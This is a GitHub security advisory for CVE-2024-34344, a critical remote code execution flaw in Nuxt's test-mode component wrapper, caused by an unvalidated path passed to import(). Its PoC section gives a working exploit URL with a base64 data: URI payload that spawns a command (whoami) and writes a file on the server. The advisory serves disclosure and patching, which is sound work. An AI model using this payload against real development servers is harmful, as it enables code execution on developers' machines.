# [C] Nuxt vulnerable to remote code execution via the browser when running the test locally

## Summary
Severity: Critical
Advisory: GHSA-v784-fjjh-f8r4
CVE: CVE-2024-34344
CWE: CWE-706, CWE-94
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2024-08-05
Source: https://github.com/advisories/GHSA-v784-fjjh-f8r4
Type: github-advisory

## Affected
- npm: `nuxt` — affected >=3.4.0 <3.12.4

## Details
### Summary
Due to the insufficient validation of the `path` parameter in the NuxtTestComponentWrapper, an attacker can execute arbitrary JavaScript on the server side, which allows them to execute arbitrary commands.

### Details
While running the test, a special component named `NuxtTestComponentWrapper` is available.
https://github.com/nuxt/nuxt/blob/4779f5906fa4d3c784c2e2d6fe5a5c5f181faaec/packages/nuxt/src/app/components/nuxt-root.vue#L42-L43

This component loads the specified path as a component and renders it.

https://github.com/nuxt/nuxt/blob/4779f5906fa4d3c784c2e2d6fe5a5c5f181faaec/packages/nuxt/src/app/components/test-component-wrapper.ts#L9-L27

There is a validation for the `path` parameter to check whether the path traversal is performed, but this check is not sufficient.

https://github.com/nuxt/nuxt/blob/4779f5906fa4d3c784c2e2d6fe5a5c5f181faaec/packages/nuxt/src/app/components/test-component-wrapper.ts#L15-L19

Since `import(...)` uses `query.path` instead of the normalized `path`, a non-normalized URL can reach the `import(...)` function.
For example, passing something like `./components/test` normalizes `path` to `/root/directory/components/test`, but `import(...)` still receives `./components/test`.

By using this behavior, it's possible to load arbitrary JavaScript by using the path like the following:
```
data:text/javascript;base64,Y29uc29sZS5sb2coMSk
```

Since `resolve(...)` resolves the filesystem path, not the URI, the above URI is treated as a relative path, but `import(...)` sees it as an absolute URI, and loads it as a JavaScript.

### PoC
1. Create a nuxt project and run it in the test mode:
```
npx nuxi@latest init test
cd test
TEST=true npm run dev
```
2. Open the following URL:
```
http://localhost:3000/__nuxt_component_test__/?path=data%3Atext%2Fjavascript%3Bbase64%2CKGF3YWl0IGltcG9ydCgnZnMnKSkud3JpdGVGaWxlU3luYygnL3RtcC90ZXN0JywgKGF3YWl0IGltcG9ydCgnY2hpbGRfcHJvY2VzcycpKS5zcGF3blN5bmMoIndob2FtaSIpLnN0ZG91dCwgJ3V0Zi04Jyk
```
3. Confirm that the output of `whoami` is written to `/tmp/test`

Demonstration video: https://www.youtube.com/watch?v=FI6mN8WbcE4

### Impact
Users who open a malicious web page in the browser while running the test locally are affected by this vulnerability, which results in the remote code execution from the malicious web page.
Since web pages can send requests to arbitrary addresses, a malicious web page can repeatedly try to exploit this vulnerability, which then triggers the exploit when the test server starts.

## References
- https://github.com/nuxt/nuxt/security/advisories/GHSA-v784-fjjh-f8r4
- https://nvd.nist.gov/vuln/detail/CVE-2024-34344
- https://github.com/nuxt/nuxt
- https://github.com/nuxt/nuxt/blob/4779f5906fa4d3c784c2e2d6fe5a5c5f181faaec/packages/nuxt/src/app/components/test-component-wrapper.ts#L15-L19
- https://github.com/nuxt/nuxt/blob/4779f5906fa4d3c784c2e2d6fe5a5c5f181faaec/packages/nuxt/src/app/components/test-component-wrapper.ts#L9-L27
